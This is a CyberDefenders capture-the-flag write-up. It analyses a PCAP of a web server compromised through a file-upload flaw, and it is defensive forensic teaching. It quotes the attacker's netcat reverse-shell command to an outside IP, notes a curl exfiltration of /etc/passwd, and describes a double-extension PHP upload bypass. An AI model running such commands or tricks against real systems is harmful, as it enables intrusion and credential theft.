# WebStrike – PCAP Analysis (CyberDefenders)

## Objective
Analyze network traffic to identify attacker activity, exploitation method, reverse shell behavior, and attempted data exfiltration.

## Scenario
The exercise is based on a PCAP containing HTTP and TCP traffic related to a compromised web application.

The goal is to reconstruct the attack chain from packet data and identify:
- the attacker
- the target server
- the initial exploitation method
- the uploaded payload
- the reverse shell behavior
- the attempted data exfiltration

## References
- https://cyberdefenders.org/blueteam-ctf-challenges/achievements/VonFaFiller/webstrike/
- https://cyberdefenders.org/walkthroughs/webstrike/

## Tools Used
- Wireshark
- HTTP stream inspection
- TCP stream inspection
- HTTP request and response analysis
- packet filtering by IP, protocol, and method

## Investigation Workflow
1. Identified the main communicating hosts in the PCAP.
2. Isolated HTTP traffic between the attacker and the target server.
3. Reviewed suspicious HTTP requests to identify the likely exploitation point.
4. Followed the upload-related HTTP stream to inspect the transmitted file.
5. Confirmed that the uploaded file was later accessed from the server.
6. Examined the payload contents to identify reverse shell behavior.
7. Pivoted to the related TCP traffic to confirm outbound shell communication.
8. Reviewed additional outbound traffic from the compromised host to identify attempted exfiltration.

## Key Evidence
- Attacker IP:
  - `117.11.88.124`
- Target web server IP:
  - `24.49.63.79`
- Suspicious upload request:
  - `POST /reviews/upload.php`
- Uploaded file name:
  - `image.jpg.php`
- Access to uploaded file:
  - `GET /reviews/uploads/image.jpg.php`
- Upload directory:
  - `/reviews/uploads/`
- Reverse shell command found in payload:
  - `nc 117.11.88.124 8080`
- Reverse shell communication port:
  - `8080`
- Outbound HTTP client observed from the compromised server:
  - `User-Agent: curl/7.81.0`
- File targeted during the outbound request:
  - `/etc/passwd`

## Findings
- The attacker interacted with the target web application over HTTP.
- A file upload request to `/reviews/upload.php` exposed the initial attack vector.
- The uploaded file used a double extension:
  - `image.jpg.php`
- The double extension indicated a PHP payload disguised as an image file.
- Subsequent HTTP requests confirmed that the uploaded file was executed from:
  - `/reviews/uploads/`
- The payload contained a reverse shell command using netcat.
- TCP traffic on port `8080` confirmed outbound communication from the compromised server back to the attacker.
- Additional outbound HTTP activity from the server showed the use of `curl`.
- The related request body contained `/etc/passwd`, indicating an attempt to retrieve sensitive account information from the host.

## Result
- Attacker IP: `117.11.88.124`
- Target Server IP: `24.49.63.79`
- Attack Vector: `file upload vulnerability`
- Uploaded Web Shell: `image.jpg.php`
- Upload Directory: `/reviews/uploads/`
- Reverse Shell Port: `8080`
- Attempted Exfiltration Target: `passwd`

## Mistakes / Friction Points
- The main analytical challenge was separating different stages of the attack from the same traffic set.
- The most important distinction was between:
  - the upload request
  - the execution of the uploaded file
  - the reverse shell connection
  - the later exfiltration attempt
- Another friction point was distinguishing:
  - the vulnerable upload script
  - the uploaded PHP payload
  - the local file later targeted for exfiltration
- A better workflow for future PCAP analysis is to record findings during the investigation instead of reconstructing them afterward.
